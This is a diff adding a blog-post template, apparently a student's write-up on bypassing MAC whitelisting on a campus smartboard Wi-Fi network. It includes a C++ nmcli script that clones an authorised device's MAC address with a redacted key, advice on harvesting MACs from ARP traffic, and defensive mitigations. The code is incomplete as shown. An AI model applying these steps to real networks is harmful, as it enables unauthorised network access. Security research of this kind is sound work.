@@ -1,0 +1,185 @@
+{% extends "base.html" %}
+{% block title %}College Wi-Fi Security Research — TushN101{% endblock %}
+{% block body_class %}is-reading{% endblock %}
+{% block content %}
+
+<article class="piece">
+    <div class="piece-layout">
+    <div class="piece-main">
+    <header class="piece-hero">
+        <p class="piece-hero__eyebrow">November 24, 2025 · Wireless Network Security</p>
+        <h1 class="piece-hero__title">College Wi-Fi Security Research: Evaluating MAC-Based Access Controls</h1>
+        <p class="piece-hero__deck">An investigation into campus network access control mechanisms, examining the security limitations of MAC address filtering in enterprise wireless environments.</p>
+    </header>
+    <div class="piece__flow">
+        <div class="prose">
+
+    <div class="post-note">
+        <p><strong>Disclaimer:</strong> This research was conducted for educational and defensive assessment purposes. All network pre-shared keys, SSIDs, and physical MAC addresses have been redacted to protect institutional infrastructure.</p>
+    </div>
+
+    <h2>1. Network Architecture and Context</h2>
+    <p>
+        Campus network environments often segment wireless traffic across distinct Service Set Identifiers (SSIDs)
+        to isolate user groups and internal systems. In our university environment, two parallel networks were deployed:
+        a standard network for general student use with restrictive outbound policies, and a dedicated network reserved
+        for classroom presentation displays and interactive smartboards.
+    </p>
+    <p>
+        While dedicated infrastructure networks often require high availability and uninterrupted connectivity for teaching tools,
+        their security posture depends heavily on the robustness of their access control boundaries.
+    </p>
+
+    <h2>2. Investigating Access Control Boundaries</h2>
+    <p>
+        Initial inspection of the smartboard network showed that devices connected using standard WPA2-PSK authentication.
+        However, attempting to authenticate standard personal devices using the pre-shared passphrase consistently failed
+        at the association phase.
+    </p>
+    <p>
+        This indicated that an additional layer of access control was enforced beyond basic WPA2 pre-shared keys.
+        Analyzing the access control mechanism revealed that the access points utilized Layer 2 Media Access Control
+        (MAC) address whitelisting, permitting only pre-approved hardware identifiers to associate with the network.
+    </p>
+    <p>
+        While MAC filtering is sometimes deployed as a quick access-control measure, it possesses well-documented architectural
+        weaknesses in wireless security models:
+    </p>
+    <ul>
+        <li><strong>Unencrypted Headers:</strong> IEEE 802.11 frame headers transmit Layer 2 source and destination MAC addresses in plaintext over the air, visible to any nearby receiver.</li>
+        <li><strong>Hardware Identifier Malleability:</strong> Modern network operating systems natively support configuring arbitrary MAC addresses on network interfaces.</li>
+        <li><strong>Absence of Cryptographic Verification:</strong> MAC filtering verifies only an asserted identifier without cryptographic proof of identity.</li>
+    </ul>
+
+    <h2>3. Technical Implementation &amp; Cross-Platform Automation</h2>
+    <p>
+        To evaluate how the network enforced its hardware identification whitelist, I developed a proof-of-concept C++
+        utility to automate interface reconfiguration and connection testing across both Linux and Windows environments:
+    </p>
+
+    <pre><code>#include &lt;iostream&gt;
+#include &lt;fstream&gt;
+#include &lt;filesystem&gt;
+#include &lt;string&gt;
+#include &lt;array&gt;
+
+std::string os = "linux";
+
+std::string run(std::string command) {
+    std::array&lt;char, 128&gt; buffer;
+    std::string output;
+    FILE* pipe = popen(command.c_str(), "r");
+    if (!pipe) return "Failed to run command: " + command;
+    while (fgets(buffer.data(), buffer.size(), pipe)) {
+        output += buffer.data();
+    }
+    pclose(pipe);
+    if (!output.empty() && output.back() == '\n')
+        output.pop_back();
+    return output;
+}
+
+int main(int argc, char const *argv[]) {
+    std::cout &lt;&lt; "[ *] Testing Tool Initialized..." &lt;&lt; std::endl;
+
+    if (!std::filesystem::exists("/etc/passwd"))
+        os = "windows";
+
+    std::cout &lt;&lt; (os == "linux"
+        ? "[ *] Detected Environment: Linux"
+        : "[ *] Detected Environment: Windows") &lt;&lt; std::endl;
+
+    if (os == "linux") connect_linux();
+    else connect_windows();
+
+    return 0;
+}
+
+void connect_linux() {
+    std::cout &lt;&lt; "[ *] Scanning for campus access point..." &lt;&lt; std::endl;
+
+    if (run("nmcli device wifi list | grep \"[CAMPUS_SMARTBOARD_SSID]\"") == "") {
+        std::cout &lt;&lt; "[ *] Connection failed: Target AP not detected." &lt;&lt; std::endl;
+        exit(1);
+    }
+
+    std::cout &lt;&lt; "[ *] Access point verified. Configuring connection profile..." &lt;&lt; std::endl;
+    run("nmcli connection delete \"CAMPUS-INFRA\"");
+    run("nmcli connection add type wifi ifname wlp2s0 con-name \"CAMPUS-INFRA\" ssid \"[CAMPUS_SMARTBOARD_SSID]\"");
+    run("nmcli connection modify \"CAMPUS-INFRA\" wifi-sec.key-mgmt wpa-psk");
+    run("nmcli connection modify \"CAMPUS-INFRA\" wifi-sec.psk \"[REDACTED_PSK]\"");
+
+    std::cout &lt;&lt; "[ *] Applying cloned MAC address configuration..." &lt;&lt; std::endl;
+    run("nmcli connection modify \"CAMPUS-INFRA\" 802-11-wireless.cloned-mac-address 84:5C:F3:XX:XX:XX");
+    run("nmcli connection modify \"CAMPUS-INFRA\" 802-11-wireless.mac-address-blacklist \"\"");
+
+    std::cout &lt;&lt; "[ *] Associating with network..." &lt;&lt; std::endl;
+    run("nmcli connection up \"CAMPUS-INFRA\"");
+    std::cout &lt;&lt; "[ *] Association complete." &lt;&lt; std::endl;
+}</code></pre>
+
+    <h2>4. Observations in Testing</h2>
+
+    <figure class="post-figure">
+        <img src="/static/post2/tool_action.png" alt="Terminal output of the automated connection script">
+        <figcaption>Execution output: access point verified, MAC cloned, and association completed</figcaption>
+    </figure>
+
+    <h3>Layer 2 Contention and Concurrency Effects</h3>
+    <p>
+        Upon configuring the interface with a valid MAC address from an authorized smartboard, the access point
+        immediately permitted network association and assigned an IP address via DHCP.
+    </p>
+    <p>
+        However, testing highlighted a critical operational challenge inherent to MAC spoofing: Layer 2 address collisions.
+        When two active devices assert the same MAC address simultaneously within the same broadcast domain:
+    </p>
+    <ul>
+        <li>Switch CAM tables and access point bridge tables experience MAC address flapping.</li>
+        <li>ARP responses produce conflicting cache entries across neighboring hosts and default gateways.</li>
+        <li>Frames intended for one device are intermittently delivered to the other, leading to high packet loss and session termination.</li>
+    </ul>
+    <p>
+        Passive analysis of the local subnet traffic revealed that broadcast ARP requests constantly expose active MAC addresses
+        of legitimate devices on the network:
+    </p>
+
+    <pre><code>00:87:31:XX:XX:XX
+5c:e4:2a:XX:XX:XX
+48:9e:bd:XX:XX:XX
+... (additional entries redacted)</code></pre>
+
+    <p>
+        This observation demonstrates that an attacker can easily harvest a pool of authorized MAC addresses by passively monitoring
+        broadcast traffic, selecting inactive devices to avoid address contention.
+    </p>
+
+    <h2>5. Security Implications and Remediation</h2>
+    <p>
+        This research highlights why MAC address filtering should not be considered a viable access-control boundary.
+        Because MAC addresses are broadcast in plaintext and trivially spoofed, filtering offers negligible security
+        against an adversary equipped with basic networking utilities.
+    </p>
+
+    <h3>Recommended Enterprise Mitigations</h3>
+    <ul>
+        <li><strong>IEEE 802.1X (WPA2/WPA3-Enterprise):</strong> Replace pre-shared keys and MAC whitelisting with enterprise authentication (such as EAP-TLS using device certificates or PEAP-MSCHAPv2), cryptographically verifying device or user identity.</li>
+        <li><strong>Network Access Control (NAC):</strong> Deploy dedicated NAC solutions capable of dynamic endpoint profiling and posture assessment rather than relying solely on Layer 2 headers.</li>
+        <li><strong>VLAN Segmentation and Isolation:</strong> Enforce strict client isolation and micro-segmentation to prevent lateral movement and packet eavesdropping across endpoints.</li>
+    </ul>
+
+        </div>
+    </div>
+
+    <footer class="piece-foot">
+        <a href="/" class="piece-foot__back">← Index</a>
+    </footer>
+    </div>
+    <aside class="piece-rail" id="piece-rail" aria-label="On this page" hidden>
+        <p class="piece-rail__label">On this page</p>
+        <nav class="piece-rail__nav" id="piece-rail-nav"></nav>
+    </aside>
+    </div>
+</article>
+
+{% endblock %}
